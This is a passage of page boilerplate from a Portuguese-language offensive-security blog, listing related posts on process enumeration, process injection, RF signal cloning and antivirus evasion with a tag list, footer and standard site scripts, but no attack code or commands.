oferecendo uma visão geral e exemplos práticos. Abordamos métodos como ofuscação de chamadas de função, criptografia de p...</p></div></div></a></div><div class="card"> <a href="/posts/get-process/"><div class="card-body"> <span class="timeago small" >Aug 6, 2024<i class="unloaded">2024-08-06T01:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Enumerando Processos pelo Nome</h3><div class="text-muted small"><p> TL;DR Neste artigo, exploramos como utilizar as APIs do Windows para enumerar processos em execução, focando nas funções CreateToolhelp32Snapshot, Process32First e Process32Next. Discutimos a im...</p></div></div></a></div><div class="card"> <a href="/posts/process-injection/"><div class="card-body"> <span class="timeago small" >Aug 7, 2024<i class="unloaded">2024-08-07T01:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Process Injection 101</h3><div class="text-muted small"><p> TL;DR Neste artigo, exploramos a técnica de Process Injection, uma abordagem avançada que permite a injeção de código em processos legítimos em execução. Amplamente utilizada em cenários de segu...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/replay-sinal-rf/" class="btn btn-outline-primary" prompt="Older"><p>Uma Jornada no Hardware Hacking: Criando um Clonador de Sinais RF</p></a> <a href="/posts/evasao-av/" class="btn btn-outline-primary" prompt="Newer"><p>Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/h41stur">H41stur</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://h41stur.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
